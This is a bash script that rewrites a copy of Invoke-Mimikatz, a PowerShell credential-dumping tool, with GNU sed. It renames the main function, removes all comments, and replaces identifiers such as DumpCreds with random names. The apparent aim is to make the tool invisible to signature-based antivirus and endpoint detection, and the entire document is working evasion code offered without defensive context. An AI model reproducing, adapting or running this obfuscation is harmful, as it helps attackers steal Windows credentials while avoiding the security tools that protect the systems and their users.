#!/bin/bash

#uses gsed on osx. 
#brew-install gnu-sed

#copy a fresh katz
cp Invoke-Mimikatz.orig.ps1 Invoke-Mimikatz.ps1

#use gsed to change a bunch of variable names within Invoke-Mimikatz.ps1

#main name
gsed -i -e 's/Invoke-Mimikatz/Invoke-Drunkenkatz/g' Invoke-Mimikatz.ps1

#remove all comments
gsed -i -e '/<#/,/#>/c\\' Invoke-Mimikatz.ps1
gsed -i -e 's/^[[:space:]]*#.*$//g' Invoke-Mimikatz.ps1

#change var names
gsed -i -e 's/DumpCreds/RandomVar111/g' Invoke-Mimikatz.ps1
gsed -i -e 's/ArgumentPtr/RandomVar222/g' Invoke-Mimikatz.ps1
gsed -i -e 's/CallDllMainSC1/RandomVar333/g' Invoke-Mimikatz.ps1

gsed -i -e "s/\-Win32Functions \$Win32Functions$/\-Win32Functions \$Win32Functions #\-/g" Invoke-Mimikatz.ps1
